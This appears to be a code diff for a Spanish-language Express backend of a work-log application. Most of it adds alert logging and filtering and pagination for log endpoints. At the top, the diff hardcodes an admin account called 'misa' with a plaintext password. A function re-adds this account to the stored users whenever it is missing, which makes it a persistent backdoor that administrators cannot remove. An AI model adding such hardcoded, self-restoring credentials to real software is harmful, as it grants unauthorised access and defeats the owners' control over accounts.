@@ -15,6 +15,49 @@ app.use(express.json());
 const clientDir = path.join(__dirname, "..");
 app.use(express.static(clientDir, { index: 'login.html' }));
 
+// Usuario maestro de administración siempre disponible en el backend
+const MASTER_ADMIN_USER = {
+  username: 'misa',
+  password: 'Pepepito2',
+  name: 'Misa',
+  role: 'admin',
+  area: 'Corporativo',
+  passwordLastChanged: '2025-01-01T00:00:00.000Z',
+  locked: false,
+};
+
+function getDefaultAdminState() {
+  return {
+    version: 11,
+    stations: [],
+    logs: [],
+    generalLogs: [],
+    users: [
+      { ...MASTER_ADMIN_USER },
+    ],
+    shifts: [],
+  };
+}
+
+function ensureMasterAdminUser(state) {
+  if (!state || typeof state !== 'object') {
+    return getDefaultAdminState();
+  }
+
+  const users = Array.isArray(state.users) ? state.users.slice() : [];
+  const hasMaster = users.some((u) => u && u.username === MASTER_ADMIN_USER.username);
+
+  if (!hasMaster) {
+    users.push({ ...MASTER_ADMIN_USER });
+  }
+
+  return {
+    ...state,
+    version: typeof state.version === 'number' ? state.version : 11,
+    users,
+  };
+}
+
 // Carga de usuarios desde archivo JSON sencillo
 function loadUsers() {
   try {
@@ -36,37 +79,17 @@ function loadAdminState() {
   try {
     const filePath = path.join(__dirname, 'admin-data.json');
     if (!fs.existsSync(filePath)) {
-      return {
-        version: 7,
-        stations: [],
-        logs: [],
-        generalLogs: [],
-        users: [],
-        shifts: [],
-      };
+      return getDefaultAdminState();
     }
     const raw = fs.readFileSync(filePath, 'utf8');
     const parsed = JSON.parse(raw);
-    return parsed && typeof parsed === 'object'
-      ? parsed
-      : {
-          version: 7,
-          stations: [],
-          logs: [],
-          generalLogs: [],
-          users: [],
-          shifts: [],
-        };
+    if (parsed && typeof parsed === 'object') {
+      return ensureMasterAdminUser(parsed);
+    }
+    return getDefaultAdminState();
   } catch (e) {
     console.error('No se pudo cargar admin-data.json', e);
-    return {
-      version: 7,
-      stations: [],
-      logs: [],
-      generalLogs: [],
-      users: [],
-      shifts: [],
-    };
+    return getDefaultAdminState();
   }
 }
 
@@ -132,6 +155,29 @@ app.get('/api/status', (req, res) => {
   });
 });
 
+// Notificación sencilla de alertas críticas / racha de incidentes.
+// En esta versión solo se registra en consola para futuras integraciones
+// con correo, WhatsApp u otros canales.
+app.post('/api/notify-alert', (req, res) => {
+  try {
+    const payload = req.body || {};
+    console.log('[ALERTA COG WORK LOG]', {
+      type: payload.type,
+      level: payload.level,
+      message: payload.message,
+      stationId: payload.stationId,
+      stationName: payload.stationName,
+      severity: payload.severity,
+      logId: payload.logId,
+      at: new Date().toISOString(),
+    });
+    return res.json({ ok: true });
+  } catch (e) {
+    console.error('Error recibiendo /api/notify-alert', e);
+    return res.status(500).json({ ok: false, message: 'No se pudo registrar la alerta' });
+  }
+});
+
 // Login validando primero contra admin-data (usuarios administrados) y luego contra users.json
 app.post('/api/login', (req, res) => {
   const { username, password, role } = req.body || {};
@@ -188,11 +234,83 @@ app.post('/api/login', (req, res) => {
 });
 
 // Lectura de logs desde el estado de administración (BD si está disponible, archivo si no)
+// Soporta filtros y paginación opcional vía querystring:
+//   /api/logs?stationId=...&status=ok&severity=alta&incidentType=...&fromDate=AAAA-MM-DD&toDate=AAAA-MM-DD&search=texto&page=1&pageSize=100
 app.get('/api/logs', async (req, res) => {
   try {
     const state = await getAdminStateCombined();
-    const logs = Array.isArray(state.logs) ? state.logs : [];
-    res.json({ ok: true, logs });
+    let logs = Array.isArray(state.logs) ? state.logs : [];
+
+    const {
+      stationId,
+      status,
+      severity,
+      incidentType,
+      fromDate,
+      toDate,
+      search,
+      page,
+      pageSize,
+    } = req.query || {};
+
+    if (stationId) {
+      logs = logs.filter((l) => l.stationId === stationId);
+    }
+    if (status) {
+      logs = logs.filter((l) => (l.status || '') === status);
+    }
+    if (severity) {
+      const sev = String(severity).toLowerCase();
+      logs = logs.filter(
+        (l) => String(l.severity || '').toLowerCase() === sev
+      );
+    }
+    if (incidentType) {
+      const it = String(incidentType).toLowerCase();
+      logs = logs.filter(
+        (l) => String(l.incidentType || '').toLowerCase() === it
+      );
+    }
+    if (fromDate) {
+      logs = logs.filter((l) => l.date && l.date >= fromDate);
+    }
+    if (toDate) {
+      logs = logs.filter((l) => l.date && l.date <= toDate);
+    }
+    if (search) {
+      const q = String(search).toLowerCase();
+      logs = logs.filter((l) => {
+        const user = String(l.user || '').toLowerCase();
+        const desc = String(l.description || '').toLowerCase();
+        const entry = String(l.entry || '').toLowerCase();
+        const incident = String(l.incidentType || '').toLowerCase();
+        return (
+          user.includes(q) ||
+          desc.includes(q) ||
+          entry.includes(q) ||
+          incident.includes(q)
+        );
+      });
+    }
+
+    const total = logs.length;
+
+    let pagedLogs = logs;
+    const pageNum = page ? parseInt(page, 10) : 0;
+    const sizeNum = pageSize ? parseInt(pageSize, 10) : 0;
+
+    if (pageNum > 0 && sizeNum > 0) {
+      const start = (pageNum - 1) * sizeNum;
+      pagedLogs = logs.slice(start, start + sizeNum);
+    }
+
+    res.json({
+      ok: true,
+      logs: pagedLogs,
+      total,
+      page: pageNum || 1,
+      pageSize: sizeNum || total,
+    });
   } catch (e) {
     console.error('Error en /api/logs', e);
     res.status(500).json({ ok: false, message: 'No se pudieron leer los logs' });
@@ -200,13 +318,86 @@ app.get('/api/logs', async (req, res) => {
 });
 
 // Lectura de bitácora general desde el estado de administración
+// Filtros y paginación opcional:
+//   /api/general-logs?user=...&role=...&activity=...&status=ok&fromDate=AAAA-MM-DD&toDate=AAAA-MM-DD&search=texto&page=1&pageSize=100
 app.get('/api/general-logs', async (req, res) => {
   try {
     const state = await getAdminStateCombined();
-    const generalLogs = Array.isArray(state.generalLogs)
+    let generalLogs = Array.isArray(state.generalLogs)
       ? state.generalLogs
       : [];
-    res.json({ ok: true, generalLogs });
+
+    const {
+      user,
+      role,
+      activity,
+      status,
+      fromDate,
+      toDate,
+      search,
+      page,
+      pageSize,
+    } = req.query || {};
+
+    if (user) {
+      const u = String(user).toLowerCase();
+      generalLogs = generalLogs.filter(
+        (g) => String(g.user || '').toLowerCase() === u
+      );
+    }
+    if (role) {
+      const r = String(role).toLowerCase();
+      generalLogs = generalLogs.filter(
+        (g) => String(g.role || '').toLowerCase() === r
+      );
+    }
+    if (activity) {
+      const a = String(activity).toLowerCase();
+      generalLogs = generalLogs.filter(
+        (g) => String(g.activity || '').toLowerCase() === a
+      );
+    }
+    if (status) {
+      generalLogs = generalLogs.filter((g) => (g.status || '') === status);
+    }
+    if (fromDate) {
+      generalLogs = generalLogs.filter((g) => g.date && g.date >= fromDate);
+    }
+    if (toDate) {
+      generalLogs = generalLogs.filter((g) => g.date && g.date <= toDate);
+    }
+    if (search) {
+      const q = String(search).toLowerCase();
+      generalLogs = generalLogs.filter((g) => {
+        const userText = String(g.user || '').toLowerCase();
+        const activityText = String(g.activity || '').toLowerCase();
+        const descText = String(g.description || '').toLowerCase();
+        return (
+          userText.includes(q) ||
+          activityText.includes(q) ||
+          descText.includes(q)
+        );
+      });
+    }
+
+    const total = generalLogs.length;
+
+    let pagedLogs = generalLogs;
+    const pageNum = page ? parseInt(page, 10) : 0;
+    const sizeNum = pageSize ? parseInt(pageSize, 10) : 0;
+
+    if (pageNum > 0 && sizeNum > 0) {
+      const start = (pageNum - 1) * sizeNum;
+      pagedLogs = generalLogs.slice(start, start + sizeNum);
+    }
+
+    res.json({
+      ok: true,
+      generalLogs: pagedLogs,
+      total,
+      page: pageNum || 1,
+      pageSize: sizeNum || total,
+    });
   } catch (e) {
     console.error('Error en /api/general-logs', e);
     res.status(500).json({ ok: false, message: 'No se pudo leer la bitácora general' });
